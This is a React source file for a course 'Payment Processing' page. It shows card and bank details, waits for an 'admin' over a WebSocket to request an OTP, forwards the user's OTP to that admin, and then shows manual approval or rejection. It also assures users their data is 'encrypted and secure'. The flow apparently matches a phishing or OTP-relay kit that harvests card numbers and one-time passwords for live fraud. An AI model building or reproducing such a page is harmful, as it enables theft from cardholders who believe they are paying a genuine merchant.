
import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, CreditCard, Shield, Clock, CheckCircle, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { io, Socket } from 'socket.io-client';

const Payment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [socket, setSocket] = useState<Socket | null>(null);
  const [showOtp, setShowOtp] = useState(false);
  const [otp, setOtp] = useState('');
  const [isProcessing, setIsProcessing] = useState(true);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState(false);

  const planData = location.state?.planData;
  const paymentData = location.state?.paymentData;

  // Function to determine card type from card number
  const getCardType = (cardNumber: string) => {
    const firstDigit = cardNumber.charAt(0);
    const firstTwoDigits = cardNumber.substring(0, 2);
    const firstFourDigits = cardNumber.substring(0, 4);

    if (firstDigit === '4') return 'Visa';
    if (['51', '52', '53', '54', '55'].includes(firstTwoDigits) || 
        (parseInt(firstFourDigits) >= 2221 && parseInt(firstFourDigits) <= 2720)) return 'Mastercard';
    if (['34', '37'].includes(firstTwoDigits)) return 'American Express';
    if (['60', '65', '81', '82', '508'].some(prefix => cardNumber.startsWith(prefix))) return 'RuPay';
    return 'Unknown';
  };

  // Function to get bank name from card number (simplified logic)
  const getBankName = (cardNumber: string) => {
    // This is a simplified example - in real applications, you'd use BIN databases
    const firstSix = cardNumber.substring(0, 6);
    
    if (firstSix.startsWith('4147')) return 'State Bank of India';
    if (firstSix.startsWith('4532')) return 'HDFC Bank';
    if (firstSix.startsWith('5132')) return 'ICICI Bank';
    if (firstSix.startsWith('4769')) return 'Axis Bank';
    if (firstSix.startsWith('4916')) return 'Punjab National Bank';
    
    return 'Banking Partner';
  };

  useEffect(() => {
    if (!planData) {
      navigate('/');
      return;
    }

    // Connect to WebSocket server
    const socketUrl = process.env.NODE_ENV === 'production' 
      ? window.location.origin
      : 'http://localhost:3001';
    
    const newSocket = io(socketUrl, {
      timeout: 10000,
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 2000,
      transports: ['websocket', 'polling']
    });
    setSocket(newSocket);

    newSocket.on('connect', () => {
      console.log('Connected to WebSocket server');
    });

    newSocket.on('show-otp', () => {
      console.log('Admin requested OTP');
      setShowOtp(true);
      setIsProcessing(false); // Stop loading spinner when OTP form appears
      setError('');
    });

    newSocket.on('payment-approved', () => {
      console.log('Payment approved by admin');
      setSuccess(true);
      setError('');
      setIsProcessing(false);
      setTimeout(() => {
        navigate('/', { 
          state: { 
            message: 'Payment successful! Welcome to your course.' 
          }
        });
      }, 2000);
    });

    newSocket.on('payment-rejected', (reason: string) => {
      console.log('Payment rejected:', reason);
      setError(reason || 'Payment was rejected. Please try again.');
      setIsProcessing(false);
      setShowOtp(false);
    });

    return () => {
      newSocket.disconnect();
    };
  }, [planData, navigate]);

  const handleOtpSubmit = () => {
    if (otp.length === 6 && socket) {
      socket.emit('otp-submitted', { otp });
      setIsProcessing(true);
      setShowOtp(false);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  if (!planData) {
    return null;
  }

  const cardType = paymentData?.cardNumber ? getCardType(paymentData.cardNumber) : '';
  const bankName = paymentData?.cardNumber ? getBankName(paymentData.cardNumber) : '';

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="flex items-center gap-4 mb-6">
          <Button
            variant="ghost"
            size="sm"
            onClick={handleBack}
            className="text-gray-600 hover:text-gray-800"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-semibold text-gray-800">Payment Processing</h1>
        </div>

        {/* Payment Card */}
        <div className="bg-white rounded-2xl shadow-xl p-6 mb-6">
          <div className="text-center mb-6">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <CreditCard className="h-8 w-8 text-blue-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">Secure Payment</h2>
            <p className="text-gray-600">Processing your payment for {planData.name}</p>
          </div>

          {/* Amount */}
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-gray-600">Amount to pay:</span>
              <span className="text-2xl font-bold text-gray-800">₹{planData.price?.toLocaleString()}</span>
            </div>
          </div>

          {/* Success State */}
          {success && (
            <div className="text-center py-8">
              <CheckCircle className="h-16 w-16 text-green-500 mx-auto mb-4" />
              <h3 className="text-xl font-semibold text-green-600 mb-2">Payment Successful!</h3>
              <p className="text-gray-600 mb-4">Redirecting you to your dashboard...</p>
            </div>
          )}

          {/* Error State */}
          {error && (
            <div className="text-center py-6">
              <AlertCircle className="h-12 w-12 text-red-500 mx-auto mb-4" />
              <h3 className="text-lg font-semibold text-red-600 mb-2">Payment Error</h3>
              <p className="text-gray-600 mb-4">{error}</p>
              <Button
                onClick={() => navigate('/checkout', { state: { planData } })}
                className="bg-blue-600 hover:bg-blue-700"
              >
                Try Again
              </Button>
            </div>
          )}

          {/* OTP Input with Bank and Card Details */}
          {showOtp && !success && !error && (
            <div className="text-center py-6">
              <Shield className="h-12 w-12 text-blue-500 mx-auto mb-4" />
              <h3 className="text-lg font-semibold text-gray-800 mb-2">Verify Transaction</h3>
              
              {/* Bank and Card Type Details */}
              <div className="bg-blue-50 rounded-lg p-4 mb-4">
                <div className="text-sm text-gray-700 space-y-1">
                  <div className="flex justify-between">
                    <span className="font-medium">Bank:</span>
                    <span>{bankName}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-medium">Card Type:</span>
                    <span>{cardType}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="font-medium">Card Number:</span>
                    <span>**** **** **** {paymentData?.cardNumber?.slice(-4) || '****'}</span>
                  </div>
                </div>
              </div>

              <p className="text-gray-600 mb-6">Please enter the OTP sent to your registered mobile number</p>
              
              <div className="flex justify-center mb-6">
                <InputOTP
                  maxLength={6}
                  value={otp}
                  onChange={setOtp}
                >
                  <InputOTPGroup>
                    <InputOTPSlot index={0} />
                    <InputOTPSlot index={1} />
                    <InputOTPSlot index={2} />
                    <InputOTPSlot index={3} />
                    <InputOTPSlot index={4} />
                    <InputOTPSlot index={5} />
                  </InputOTPGroup>
                </InputOTP>
              </div>

              <Button
                onClick={handleOtpSubmit}
                disabled={otp.length !== 6}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50"
              >
                Verify OTP
              </Button>
            </div>
          )}

          {/* Processing State - only shown when not showing OTP */}
          {isProcessing && !showOtp && !success && !error && (
            <div className="text-center py-8">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
              <h3 className="text-lg font-semibold text-gray-800 mb-2">Processing Payment</h3>
              <p className="text-gray-600">Please wait while we process your payment securely...</p>
              <div className="flex items-center justify-center gap-2 mt-4 text-sm text-gray-500">
                <Clock className="h-4 w-4" />
                <span>This may take a few moments</span>
              </div>
            </div>
          )}
        </div>

        {/* Security Notice */}
        <div className="bg-white rounded-xl p-4">
          <div className="flex items-center gap-3">
            <Shield className="h-5 w-5 text-green-500" />
            <div>
              <p className="text-sm font-medium text-gray-800">Secure Payment</p>
              <p className="text-xs text-gray-600">Your payment information is encrypted and secure</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Payment;
